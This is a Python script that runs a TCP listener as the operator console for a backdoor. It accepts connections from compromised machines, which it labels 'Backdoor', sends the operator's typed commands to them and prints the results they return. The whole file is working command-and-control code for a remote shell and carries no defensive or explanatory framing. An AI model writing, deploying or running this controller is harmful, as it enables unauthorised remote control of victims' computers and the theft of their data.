import socket
import os
import sys
import time

def main():
    os.system('clear')

    if len(sys.argv) != 3:
        sys.exit('USAGE: <LHOST> <LPORT>\r\n')

    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((sys.argv[1], int(sys.argv[2])))
        print(f"[+] TCP listener active @ {sys.argv[1]}:{sys.argv[2]}...\r\n")
        s.listen()

        while True:
            client_socket, client_address = s.accept()
            
            _choice = input(f"[!] Backdoor @ {client_address[0]}:{client_address[1]} wants to connect! Allow? (Y/n): ")
            if _choice.lower() == 'y':
                os.system('cls' if os.name == 'nt' else 'clear')

                message = "Hello and Welcome".encode()
                client_socket.send(message)
                

                # Set a timeout for receiving data
                client_socket.settimeout(5)  # Set timeout to 5 seconds

                while True:
                    try:
                        _cmd = input("> ")

                        if _cmd.lower() == 'goodbye':
                            client_socket.close()
                            break
                        else:
                            client_socket.send(_cmd.encode())
                            results = ""
                            while True:
                                try:
                                    part = client_socket.recv(1024).decode()
                                    results += part
                                    if len(part) < 1024:  # End of transmission
                                        break
                                except socket.timeout:
                                    break  # Exit the inner while loop if a timeout occurs
                            print(f'\r\n{results}')
                    except socket.error:
                        print("Transmission error!")
                        #break
                        
            else:
                # Reject connection
                message = "goodbye".encode()
                client_socket.send(message)
                #s.close()
            
    except KeyboardInterrupt:
        sys.exit('\r\n[-] Connection terminated.\r\n')
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
